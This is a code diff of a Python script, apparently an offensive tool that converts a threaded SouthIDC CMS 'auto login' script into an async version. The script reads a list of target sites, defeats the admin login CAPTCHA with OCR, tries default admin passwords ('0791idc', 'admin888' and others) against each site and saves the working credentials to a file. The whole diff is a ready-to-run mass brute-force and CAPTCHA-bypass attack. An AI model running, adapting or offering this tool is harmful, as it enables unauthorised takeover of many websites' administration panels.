@@ -1,192 +1,192 @@
-import requests
+import asyncio
+import aiohttp
 from PIL import Image
 import pytesseract
 import io
-import time
-import threading
-from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+from tqdm import tqdm
 import urllib3
 from queue import Queue
-import warnings
-import json
-import os
-from tqdm import tqdm
+import threading
+import sys
 
-#southidc cms auto login script, written by Chirag Artani
-
-# Suppress SSL warnings
+# Suppress warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-warnings.filterwarnings('ignore')
 
 # Global variables
 results_queue = Queue()
-successful_urls_file = 'successful_urls.json'
-successful_urls_lock = threading.Lock()
 processed_urls = 0
-total_urls = 0
 progress_lock = threading.Lock()
+print_lock = threading.Lock()
 
-def update_progress():
-    """Update the progress counter"""
-    global processed_urls
-    with progress_lock:
-        processed_urls += 1
+# Configurations
+CONCURRENT_TASKS = 2
+TIMEOUT = 30
+MAX_RETRIES = 3
+PASSWORDS = ['0791idc', 'admin123', 'admin888', '123456']
 
-def load_successful_urls():
-    """Load previously successful URLs from JSON file"""
+def status_print(message, url):
+    """Thread-safe status printing"""
+    with print_lock:
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        print(f"[{timestamp}] [{url}] {message}")
+        sys.stdout.flush()
+
+async def get_captcha(session, url):
     try:
-        if os.path.exists(successful_urls_file):
-            with open(successful_urls_file, 'r') as f:
-                return json.load(f)
-        return {}
-    except:
-        return {}
-
-def save_successful_url(url, credentials):
-    """Save successful URL and credentials to JSON file"""
-    with successful_urls_lock:
-        successful_urls = load_successful_urls()
-        successful_urls[url] = credentials
-        with open(successful_urls_file, 'w') as f:
-            json.dump(successful_urls, f, indent=4)
-
-def get_captcha(session, captcha_url):
-    """Get and process CAPTCHA image"""
-    try:
-        response = session.get(captcha_url, verify=False, timeout=10)
-        if response.status_code == 200:
-            img = Image.open(io.BytesIO(response.content))
-            img = img.convert('L')
-            captcha_text = pytesseract.image_to_string(img)
-            captcha_text = ''.join(e for e in captcha_text if e.isalnum())
-            return captcha_text
-        return None
-    except:
-        return None
-
-def try_login(url, username, password):
-    """Attempt login with specific credentials"""
-    try:
-        session = requests.Session()
         captcha_url = f"{url}/admin/CheckCode/CheckCode.asp"
-        login_url = f"{url}/admin/CheckLogin.asp"
+        status_print(f"Fetching CAPTCHA from: {captcha_url}", url)
         
-        captcha_text = get_captcha(session, captcha_url)
-        if not captcha_text:
-            return False
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
+            'Referer': f"{url}/admin/Login.asp",
+            'Connection': 'keep-alive'
+        }
+        
+        async with session.get(captcha_url, ssl=False, timeout=TIMEOUT, headers=headers) as response:
+            if response.status == 200:
+                status_print("CAPTCHA image received successfully", url)
+                image_data = await response.read()
+                img = Image.open(io.BytesIO(image_data))
+                
+                status_print("Processing CAPTCHA image...", url)
+                img = img.convert('L')
+                img = img.point(lambda x: 0 if x < 128 else 255, '1')
+                
+                custom_config = '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+                captcha_text = pytesseract.image_to_string(img, config=custom_config).strip()
+                
+                captcha_text = ''.join(c for c in captcha_text if c.isalnum())[:6]
+                if len(captcha_text) == 6:
+                    status_print(f"CAPTCHA extracted successfully: {captcha_text}", url)
+                    return captcha_text.lower()
+                else:
+                    status_print(f"Invalid CAPTCHA length: {len(captcha_text)}", url)
+            else:
+                status_print(f"Failed to get CAPTCHA. Status: {response.status}", url)
+    except Exception as e:
+        status_print(f"Error getting CAPTCHA: {str(e)}", url)
+    return None
 
-        login_data = {
-            'LoginName': username,
+async def try_login(session, url, captcha, password):
+    try:
+        login_url = f"{url}/admin/CheckLogin.asp"
+        status_print(f"Attempting login with CAPTCHA: {captcha}, Password: {password}", url)
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': url,
+            'Referer': f"{url}/admin/Login.asp",
+            'Connection': 'keep-alive'
+        }
+
+        data = {
+            'LoginName': 'admin',
             'LoginPassword': password,
-            'CheckCode': captcha_text,
+            'CheckCode': captcha,
             'Submit': 'confirm'
         }
 
-        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False, timeout=10)
-        return response.status_code == 302 and 'main.asp' in response.headers.get('Location', '')
-    except:
+        async with session.post(login_url, data=data, ssl=False, headers=headers, allow_redirects=False) as response:
+            status = response.status
+            location = response.headers.get('Location', '')
+            status_print(f"Login response - Status: {status}, Location: {location}", url)
+            return status == 302 and ('main.asp' in location or 'default.asp' in location)
+    except Exception as e:
+        status_print(f"Login error: {str(e)}", url)
         return False
 
-def process_url(url):
-    """Process single URL with multiple passwords"""
+async def process_url(url):
     try:
-        url = url.strip()
         if not url.startswith(('http://', 'https://')):
             url = 'http://' + url
 
-        # Check if URL was previously successful
-        successful_urls = load_successful_urls()
-        if url in successful_urls:
-            update_progress()
-            return
-            
-        passwords = ['0791idc', 'admin123', '123456', 'admin888']
-        username = 'admin'
+        status_print("Starting processing", url)
+        connector = aiohttp.TCPConnector(ssl=False)
+        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
         
-        for password in passwords:
-            if try_login(url, username, password):
-                success_msg = f"[SUCCESS] {url} - admin:{password}"
-                credentials = f"admin:{password}"
-                save_successful_url(url, credentials)
-                results_queue.put(success_msg)
-                print(f"\n{success_msg}")
-                break
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            # Verify login page
+            status_print("Checking admin login page", url)
+            try:
+                async with session.get(f"{url}/admin/Login.asp", ssl=False) as response:
+                    if response.status != 200:
+                        status_print("Admin login page not accessible", url)
+                        return
+                    status_print("Admin login page found", url)
+            except Exception as e:
+                status_print(f"Error accessing admin page: {str(e)}", url)
+                return
+
+            # Try each password
+            for password in PASSWORDS:
+                status_print(f"Testing password: {password}", url)
                 
-        update_progress()
-    except:
-        update_progress()
+                # Try multiple CAPTCHA attempts for each password
+                for attempt in range(MAX_RETRIES):
+                    status_print(f"Starting attempt {attempt + 1}/{MAX_RETRIES} with password {password}", url)
+                    await asyncio.sleep(1)
+                    
+                    captcha = await get_captcha(session, url)
+                    if not captcha:
+                        status_print("Failed to get valid CAPTCHA, retrying...", url)
+                        continue
+                    
+                    if await try_login(session, url, captcha, password):
+                        success_msg = f"[SUCCESS] {url} - admin:{password} (CAPTCHA: {captcha})"
+                        status_print(f"Login successful! {success_msg}", url)
+                        with open('successful_logins.txt', 'a') as f:
+                            f.write(f"{success_msg}\n")
+                        return  # Exit after first successful login
+                    else:
+                        status_print(f"Login failed with password {password}, will retry with new CAPTCHA", url)
+                
+                status_print(f"All attempts failed with password {password}", url)
+                await asyncio.sleep(1)
 
-def process_urls_with_progress(urls, max_threads=10):
-    """Process multiple URLs using thread pool with progress bar"""
-    global total_urls
-    total_urls = len(urls)
-    
-    with tqdm(total=total_urls, desc="Processing URLs", unit="url") as pbar:
-        def update_pbar():
-            while processed_urls < total_urls:
-                current = processed_urls
-                pbar.n = current
-                pbar.refresh()
-                time.sleep(0.1)
-            pbar.n = total_urls
-            pbar.refresh()
-            
-        # Start progress bar update thread
-        progress_thread = threading.Thread(target=update_pbar)
-        progress_thread.daemon = True
-        progress_thread.start()
-        
-        # Process URLs
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            executor.map(process_url, urls)
-            
-        progress_thread.join(timeout=1)
+    except Exception as e:
+        status_print(f"Error in processing: {str(e)}", url)
+    finally:
+        global processed_urls
+        with progress_lock:
+            processed_urls += 1
+        status_print("Processing completed", url)
 
-def main():
+async def main():
     try:
-        # Read URLs from file
         with open('urls.txt', 'r') as f:
-            urls = f.readlines()
-        
-        # Remove empty lines and whitespace
-        urls = [url.strip() for url in urls if url.strip()]
-        
+            urls = [url.strip() for url in f.readlines() if url.strip()]
+
         if not urls:
             print("No URLs found in urls.txt")
             return
-        
-        # Load existing successful URLs
-        successful_urls = load_successful_urls()
-        remaining_urls = [url for url in urls if url not in successful_urls]
-        
-        if not remaining_urls:
-            print("All URLs have been previously tested successfully.")
-            print("Existing successful URLs:")
-            for url, creds in successful_urls.items():
-                print(f"[PREVIOUS] {url} - {creds}")
-            return
-            
-        print(f"Starting scan of {len(remaining_urls)} URLs...")
-        print(f"Skipping {len(successful_urls)} previously successful URLs...")
+
+        print(f"Starting scan of {len(urls)} URLs...")
         print("Successful logins will be displayed below:")
         print("-" * 50)
-        
-        # Start processing with progress bar
-        process_urls_with_progress(remaining_urls, max_threads=20)
-        
-        # Save results to file
-        if not results_queue.empty():
-            with open('successful_logins.txt', 'a') as f:
-                while not results_queue.empty():
-                    f.write(results_queue.get() + '\n')
-            print("\nResults have been saved to successful_logins.txt")
-        else:
-            print("\nNo new successful logins found.")
-            
-    except FileNotFoundError:
-        print("Error: urls.txt not found")
+
+        with tqdm(total=len(urls), desc="Processing URLs", unit="url") as pbar:
+            tasks = []
+            sem = asyncio.Semaphore(CONCURRENT_TASKS)
+
+            async def process_with_semaphore(url):
+                async with sem:
+                    await process_url(url)
+                    pbar.update(1)
+
+            for url in urls:
+                task = asyncio.create_task(process_with_semaphore(url))
+                tasks.append(task)
+
+            await asyncio.gather(*tasks)
+
+        print("\nScan completed!")
+
     except Exception as e:
         print(f"An error occurred: {str(e)}")
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
